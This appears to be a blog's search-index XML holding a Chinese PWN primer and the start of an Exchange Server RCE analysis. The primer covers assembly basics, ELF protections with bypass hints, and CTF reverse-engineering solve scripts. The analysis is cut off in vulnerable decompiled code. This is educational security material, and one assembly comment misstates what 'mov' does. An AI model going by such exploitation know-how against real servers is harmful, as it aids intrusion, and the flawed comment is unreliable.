<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PWN 入门基础</title>
      <link href="2021/04/07/pwn-primer-basic/"/>
      <url>2021/04/07/pwn-primer-basic/</url>
      
        <content type="html"><![CDATA[<p>这一系列文章是对项目<a href="'https://github.com/guyinatuxedo/nightmare'">nightmare</a>进行翻译和学习得来，是自己在学习的过程中的一些记录，可能会有些混乱，不保证文章的内容是正确无误，如果有任何问题欢迎指出。</p><h1 id="1-汇编以及反汇编基础"><a href="#1-汇编以及反汇编基础" class="headerlink" title="1.汇编以及反汇编基础"></a>1.汇编以及反汇编基础</h1><h2 id="1-1-寄存器"><a href="#1-1-寄存器" class="headerlink" title="1.1 寄存器"></a>1.1 寄存器</h2><p>这里引用CSAPP第三章的一张图</p><p><img src="/img/pwn/basic/1.png" alt="register"></p><p>寄存器所占用的字节数大小：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+-----------------+---------------+---------------+------------+</span><br><span class="line">| 8 Byte Register | Lower 4 Bytes | Lower 2 Bytes | Lower Byte |</span><br><span class="line">+-----------------+---------------+---------------+------------+</span><br><span class="line">|   rbp           |     ebp       |     bp        |     bpl    |</span><br><span class="line">|   rsp           |     esp       |     sp        |     spl    |</span><br><span class="line">|   rip           |     eip       |               |            |</span><br><span class="line">|   rax           |     eax       |     ax        |     al     |</span><br><span class="line">|   rbx           |     ebx       |     bx        |     bl     |</span><br><span class="line">|   rcx           |     ecx       |     cx        |     cl     |</span><br><span class="line">|   rdx           |     edx       |     dx        |     dl     |</span><br><span class="line">|   rsi           |     esi       |     si        |     sil    |</span><br><span class="line">|   rdi           |     edi       |     di        |     dil    |</span><br><span class="line">|   r8            |     r8d       |     r8w       |     r8b    |</span><br><span class="line">|   r9            |     r9d       |     r9w       |     r9b    |</span><br><span class="line">|   r10           |     r10d      |     r10w      |     r10b   |</span><br><span class="line">|   r11           |     r11d      |     r11w      |     r11b   |</span><br><span class="line">|   r12           |     r12d      |     r12w      |     r12b   |</span><br><span class="line">|   r13           |     r13d      |     r13w      |     r13b   |</span><br><span class="line">|   r14           |     r14d      |     r14w      |     r14b   |</span><br><span class="line">|   r15           |     r15d      |     r15w      |     r15b   |</span><br><span class="line">+-----------------+---------------+---------------+------------+</span><br></pre></td></tr></table></figure><p>寄存器中的标志位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">00:     Carry Flag</span><br><span class="line">01:     always 1</span><br><span class="line">02:     Parity Flag</span><br><span class="line">03:     always 0</span><br><span class="line">04:     Adjust Flag</span><br><span class="line">05:     always 0</span><br><span class="line">06:     Zero Flag</span><br><span class="line">07:     Sign Flag</span><br><span class="line">08:     Trap Flag</span><br><span class="line">09:     Interruption Flag     </span><br><span class="line">10:     Direction Flag</span><br><span class="line">11:     Overflow Flag</span><br><span class="line">12:     I&#x2F;O Privilege Field lower bit</span><br><span class="line">13:     I&#x2F;O Privilege Field higher bit</span><br><span class="line">14:     Nested Task Flag</span><br><span class="line">15:     Resume Flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">其余的flags可以下面网址获取：</span><br><span class="line">https:&#x2F;&#x2F;en.wikibooks.org&#x2F;wiki&#x2F;X86_Assembly&#x2F;X86_Architecture</span><br></pre></td></tr></table></figure><h2 id="1-2-参数的传递方式"><a href="#1-2-参数的传递方式" class="headerlink" title="1.2 参数的传递方式"></a>1.2 参数的传递方式</h2><p>在X86中，参数通过栈来传递；在X64中，则通过寄存器来传递，如果参数过多，第6个参数之后的都通过栈来传递。如下图所示：</p><p><img src="/img/pwn/basic/2.png" alt="parameters"></p><h2 id="1-3-指令"><a href="#1-3-指令" class="headerlink" title="1.3 指令"></a>1.3 指令</h2><h3 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rax, rdx    &#x2F;&#x2F;rax &#x3D; rax + rdx</span><br><span class="line">mov rax, [rdx]  &#x2F;&#x2F;rdx地址指向的值赋值给rax   []表示地址</span><br><span class="line">mov [rax], rdx  &#x2F;&#x2F;把rdx的值赋值给rax地址指向的值，rax寄存器中的值不变</span><br></pre></td></tr></table></figure><h3 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea指令计算第二个操作数的地址，并把地址赋值给第一个操作数</span><br><span class="line"></span><br><span class="line">lea rdi, [rbx+0x10]     &#x2F;&#x2F;把rbx+0x10的地址赋值到rdi</span><br></pre></td></tr></table></figure><h3 id="add-amp-sub-amp-xor"><a href="#add-amp-sub-amp-xor" class="headerlink" title="add &amp; sub &amp; xor"></a>add &amp; sub &amp; xor</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add rax, rdx    &#x2F;&#x2F; rax &#x3D; rax + rdx</span><br><span class="line">sub rsp, 0x10   &#x2F;&#x2F; rsp &#x3D; rsp - x010</span><br><span class="line">xor rdx, rax    &#x2F;&#x2F; rdx &#x3D; rdx ^ rax</span><br></pre></td></tr></table></figure><h3 id="push-amp-pop"><a href="#push-amp-pop" class="headerlink" title="push &amp; pop"></a>push &amp; pop</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">入栈与出栈</span><br><span class="line"></span><br><span class="line">push rax    &#x2F;&#x2F;把rax寄存器保存的内容入栈，保存在栈顶</span><br><span class="line">pop rax     &#x2F;&#x2F;出栈，栈顶的8个字节将以rax寄存器结尾</span><br><span class="line">&#x2F;&#x2F;x86中入栈出栈为4 bytes，x64为8 bytes</span><br></pre></td></tr></table></figure><h3 id="jmp-amp-jnz-amp-jz"><a href="#jmp-amp-jnz-amp-jz" class="headerlink" title="jmp &amp; jnz &amp; jz"></a>jmp &amp; jnz &amp; jz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp 0x12345     &#x2F;&#x2F;jump to 0x12345</span><br><span class="line">jnz     &#x2F;&#x2F;jump if not zero</span><br><span class="line">jz      &#x2F;&#x2F;jump if zero</span><br></pre></td></tr></table></figure><h3 id="call-amp-ret"><a href="#call-amp-ret" class="headerlink" title="call &amp; ret"></a>call &amp; ret</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">和jmp类似，不同的是会把rbp 和 rip寄存器的值push到栈中，然后调到指定的地址，常用于函数调用，在函数调用完成后，ret指令会被调用，然后弹出入栈的值rbp, rip，可以在中断处继续执行。</span><br></pre></td></tr></table></figure><h2 id="1-4-汇编代码片段"><a href="#1-4-汇编代码片段" class="headerlink" title="1.4 汇编代码片段"></a>1.4 汇编代码片段</h2><h3 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x080483fb &lt;+0&gt;: lea    ecx,[esp+0x4]</span><br><span class="line">   0x080483ff &lt;+4&gt;: and    esp,0xfffffff0</span><br><span class="line">   0x08048402 &lt;+7&gt;: push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x08048405 &lt;+10&gt;:    push   ebp</span><br><span class="line">   0x08048406 &lt;+11&gt;:    mov    ebp,esp</span><br><span class="line">   0x08048408 &lt;+13&gt;:    push   ecx</span><br><span class="line">   0x08048409 &lt;+14&gt;:    sub    esp,0x4</span><br><span class="line">   0x0804840c &lt;+17&gt;:    sub    esp,0xc</span><br><span class="line">   0x0804840f &lt;+20&gt;:    push   0x80484b0</span><br><span class="line">   0x08048414 &lt;+25&gt;:    call   0x80482d0 &lt;puts@plt&gt;</span><br><span class="line">   0x08048419 &lt;+30&gt;:    add    esp,0x10</span><br><span class="line">   0x0804841c &lt;+33&gt;:    mov    eax,0x0</span><br><span class="line">   0x08048421 &lt;+38&gt;:    mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08048424 &lt;+41&gt;:    leave  </span><br><span class="line">   0x08048425 &lt;+42&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x08048428 &lt;+45&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">; 上面的没有什么特别的操作，主要就是调用了一个puts函数</span><br><span class="line"></span><br><span class="line">0x0804840f &lt;+20&gt;:   push   0x80484b0</span><br><span class="line">0x08048414 &lt;+25&gt;:   call   0x80482d0 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure><h3 id="if-then"><a href="#if-then" class="headerlink" title="if then"></a>if then</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble main </span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x080483fb &lt;+0&gt;: lea    ecx,[esp+0x4]</span><br><span class="line">   0x080483ff &lt;+4&gt;: and    esp,0xfffffff0</span><br><span class="line">   0x08048402 &lt;+7&gt;: push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x08048405 &lt;+10&gt;:    push   ebp</span><br><span class="line">   0x08048406 &lt;+11&gt;:    mov    ebp,esp</span><br><span class="line">   0x08048408 &lt;+13&gt;:    push   ecx</span><br><span class="line">   0x08048409 &lt;+14&gt;:    sub    esp,0x14</span><br><span class="line">   0x0804840c &lt;+17&gt;:    mov    DWORD PTR [ebp-0xc],0xa</span><br><span class="line">   0x08048413 &lt;+24&gt;:    cmp    DWORD PTR [ebp-0xc],0xa</span><br><span class="line">   0x08048417 &lt;+28&gt;:    jne    0x8048429 &lt;main+46&gt;</span><br><span class="line">   0x08048419 &lt;+30&gt;:    sub    esp,0xc</span><br><span class="line">   0x0804841c &lt;+33&gt;:    push   0x80484c0</span><br><span class="line">   0x08048421 &lt;+38&gt;:    call   0x80482d0 &lt;puts@plt&gt;</span><br><span class="line">   0x08048426 &lt;+43&gt;:    add    esp,0x10</span><br><span class="line">   0x08048429 &lt;+46&gt;:    mov    eax,0x0</span><br><span class="line">   0x0804842e &lt;+51&gt;:    mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08048431 &lt;+54&gt;:    leave  </span><br><span class="line">   0x08048432 &lt;+55&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x08048435 &lt;+58&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>首先给ebp-0xc地址的值赋值为0xa</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov    DWORD PTR [ebp-0xc],0xa</span><br></pre></td></tr></table></figure><p>然后再进行比较，判断该值是否等于0xa，如果不相等，则跳转到main+46这个位置，但是刚刚才做了赋值操作，所以jne这个跳转不会发生</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048413 &lt;+24&gt;:   cmp    DWORD PTR [ebp-0xc],0xa</span><br><span class="line">0x08048417 &lt;+28&gt;:   jne    0x8048429 &lt;main+46&gt;</span><br></pre></td></tr></table></figure><p>然后调用puts函数，输出结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x08048419 &lt;+30&gt;:   sub    esp,0xc</span><br><span class="line">0x0804841c &lt;+33&gt;:   push   0x80484c0</span><br><span class="line">0x08048421 &lt;+38&gt;:   call   0x80482d0 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure><h3 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble main </span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x080483fb &lt;+0&gt;: lea    ecx,[esp+0x4]</span><br><span class="line">   0x080483ff &lt;+4&gt;: and    esp,0xfffffff0</span><br><span class="line">   0x08048402 &lt;+7&gt;: push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x08048405 &lt;+10&gt;:    push   ebp</span><br><span class="line">   0x08048406 &lt;+11&gt;:    mov    ebp,esp</span><br><span class="line">   0x08048408 &lt;+13&gt;:    push   ecx</span><br><span class="line">   0x08048409 &lt;+14&gt;:    sub    esp,0x14</span><br><span class="line">   0x0804840c &lt;+17&gt;:    mov    DWORD PTR [ebp-0xc],0x0</span><br><span class="line">   0x08048413 &lt;+24&gt;:    jmp    0x804842c &lt;main+49&gt;</span><br><span class="line">   0x08048415 &lt;+26&gt;:    sub    esp,0x8</span><br><span class="line">   0x08048418 &lt;+29&gt;:    push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x0804841b &lt;+32&gt;:    push   0x80484c0</span><br><span class="line">   0x08048420 &lt;+37&gt;:    call   0x80482d0 &lt;printf@plt&gt;</span><br><span class="line">   0x08048425 &lt;+42&gt;:    add    esp,0x10</span><br><span class="line">   0x08048428 &lt;+45&gt;:    add    DWORD PTR [ebp-0xc],0x1</span><br><span class="line">   0x0804842c &lt;+49&gt;:    cmp    DWORD PTR [ebp-0xc],0x13</span><br><span class="line">   0x08048430 &lt;+53&gt;:    jle    0x8048415 &lt;main+26&gt;</span><br><span class="line">   0x08048432 &lt;+55&gt;:    mov    eax,0x0</span><br><span class="line">   0x08048437 &lt;+60&gt;:    mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x0804843a &lt;+63&gt;:    leave  </span><br><span class="line">   0x0804843b &lt;+64&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x0804843e &lt;+67&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>首先在栈上申请了一个变量ebp-0xc，值为0x0，然后jmp跳到（0x804842c）main+49</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0804840c &lt;+17&gt;:   mov    DWORD PTR [ebp-0xc],0x0</span><br><span class="line">0x08048413 &lt;+24&gt;:   jmp    0x804842c &lt;main+49&gt;</span><br></pre></td></tr></table></figure><p>接着进行判断，比较ebp-0xc 和 0x13，如果小于0x13, 则跳转到 0x8048415 &lt;main+26&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0804842c &lt;+49&gt;:   cmp    DWORD PTR [ebp-0xc],0x13</span><br><span class="line">0x08048430 &lt;+53&gt;:   jle    0x8048415 &lt;main+26&gt;</span><br></pre></td></tr></table></figure><p>跟进到main+26</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x08048415 &lt;+26&gt;:   sub    esp,0x8</span><br><span class="line">0x08048418 &lt;+29&gt;:   push   DWORD PTR [ebp-0xc]</span><br><span class="line">0x0804841b &lt;+32&gt;:   push   0x80484c0</span><br><span class="line">0x08048420 &lt;+37&gt;:   call   0x80482d0 &lt;printf@plt&gt;</span><br><span class="line">0x08048425 &lt;+42&gt;:   add    esp,0x10</span><br><span class="line">0x08048428 &lt;+45&gt;:   add    DWORD PTR [ebp-0xc],0x1</span><br></pre></td></tr></table></figure><p>给栈上分配一个空间，并且用printf函数以某种格式输出ebp-0xc的内容，然后ebp-0xc += 0x1，接着就继续进行判断，整个过程就是一个for循环，伪代码大概如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int i &#x3D; 0;</span><br><span class="line">for (i &#x3D; 0; i &lt; 20; i++)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%d&quot;, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-5-ELF文件的安全缓解措施"><a href="#1-5-ELF文件的安全缓解措施" class="headerlink" title="1.5 ELF文件的安全缓解措施"></a>1.5 ELF文件的安全缓解措施</h2><pre><code>1. RELRO: 有partial RELRO和FULL RELRO, 如果开启，则无法修改got表2. Stack： 如果栈中开启Canary found，就不能用直接溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量，leak canary， overwrite canary的方法来绕过3. NX： NX enabled 如果这个保护开启就意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp方法就不能用，但是可以利用rop这种方法绕过4.PIE：PIE enabled 如果程序开启地址随机号，就意味着程序每次运行的时候地址都会变化，而如果没有开启PIE，那么No PIE (0x400000)，括号内的数据就是程序的基地址</code></pre><h1 id="2-逆向练习题"><a href="#2-逆向练习题" class="headerlink" title="2.逆向练习题"></a>2.逆向练习题</h1><h2 id="2-1-helithumper-re"><a href="#2-1-helithumper-re" class="headerlink" title="2.1 helithumper_re"></a>2.1 helithumper_re</h2><p>首先运行程序，没什么特别的地方，只是要求我们输入flag。使用IDA查看程序</p><p><img src="/img/pwn/basic/3.png" alt="re1"></p><p>可以看得到，调用了validate函数判断用户的输入是否正确，跟进validate</p><p><img src="/img/pwn/basic/4.png" alt="re2"></p><p>从上面代码中可以看出，如果a1[i] != <em>(&amp;v4 + i)，则会退出。</em>(&amp;v4 + i) 分别对应变量v5, v6, v7 …. v17，所以只要循环输出v4 – v17即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a &#x3D; [102,108,97,103,123,72,117,67,102,95,108,65,98,125]</span><br><span class="line">&gt;&gt;&gt; for i in a:</span><br><span class="line">...     print chr(i),</span><br><span class="line">... </span><br><span class="line">f l a g &#123; H u C f _ l A b &#125;</span><br></pre></td></tr></table></figure><h2 id="2-2-beleaf-reverse"><a href="#2-2-beleaf-reverse" class="headerlink" title="2.2 beleaf reverse"></a>2.2 beleaf reverse</h2><p>直接使用IDA反汇编，得到源码</p><p><img src="/img/pwn/basic/5.png" alt="re3"></p><p>代码的关键点在sub_7FA(s[i] != qword_2014E0[i])，从代码中可以看出flag的长度不能小于0x20，查看qword_2014E0这个数组对应的值：</p><p><img src="/img/pwn/basic/6.png" alt="re4"></p><p>可以看到数组里面的值为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 9, 0x11, 0x27, 2, 0, 0x12, 3, 8, 0x12, 9, 0x12, 0x11, 1, 3, 0x13, 4, 3, 5, 0x15, 0x2e, 0x1, 3, 0xa, 0x12, 3, 1, 0x2e, 0x16, 0x2e, 0xa, 0x12, 6]</span><br></pre></td></tr></table></figure><p>然后我们再看看sub_7FA函数是怎么处理输入的字符串</p><p><img src="/img/pwn/basic/7.png" alt="re5"></p><p>从代码中看到，关键点在于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( a1 &#x3D;&#x3D; *((_DWORD *)&amp;off_201020 + v2) )</span><br><span class="line">      return v2;</span><br></pre></td></tr></table></figure><p>也就是返回的v2的值要一一对应qword_2014E0数组的值，也就是说v2的第一次返回值必须是1，第二次必须是9，所以输入的a1第一个值为a1 == *((_DWORD *)&amp;off_201020 + 1，第二个值为a1 == *((_DWORD *)&amp;off_201020 + 9。接着查看off_201020数组(v2在这里是index)所对应的值是哪些</p><p><img src="/img/pwn/basic/8.png" alt="re8"></p><p>从上面可以看出，对应的值分别是0x77, 0x66, 0x7b, 0x5f, 0x6e, 0x79, 0x7d, 0xffffffff, 0x62, 0x6c, 0x72, 0xffffffff, 0xffffffff, …..</p><p>所以可以得出以下POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">values &#x3D; [0x77,0x66,0x7b,0x5f,0x6e,0x79,0x7d,0xffffffff,0x62,0x6c,0x72,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0x61,0x65,0x69,0xffffffff,0x6f,0x74,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0x67,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0x75,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0xffffffff,0x00]</span><br><span class="line">wanted &#x3D; [0x01,0x09,0x11,0x27,0x02,0x00,0x12,0x03,0x08,0x12,0x09,0x12,0x11,0x01,0x03,0x13,0x04,0x03,0x05,0x15,0x2e,0x0a,0x03,0x0a,0x12,0x03,0x01,0x2e,0x16,0x2e,0x0a,0x12,0x06,]</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in wanted:</span><br><span class="line">    flag +&#x3D; chr(values[i])</span><br><span class="line"></span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-17803 &amp; CVE-2020-17804 Exchange Server RCE</title>
      <link href="2020/11/22/Exchange-New-Export-Certificate-RCE/"/>
      <url>2020/11/22/Exchange-New-Export-Certificate-RCE/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><code>New-ExchangeCertificate</code>和<code>Export-ExchangeCertificate</code>命令可以向任意目录写入文件导致</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先来看看<code>New-ExchangeCertificate</code>的代码是怎么写的：</p><p>漏洞代码出现在<code>New-ExchangeCertificate</code>的<code>WriteRequest</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">private void WriteRequest(byte[] data, string text)</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        if (this.BinaryEncoded)</span><br><span class="line">        &#123;</span><br><span class="line">            using (FileStream fileStream &#x3D; File.Create(this.RequestFile))</span><br><span class="line">            &#123;</span><br><span class="line">                fileStream.Write(data, 0, data.Length);</span><br><span class="line">                goto IL_4F;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span 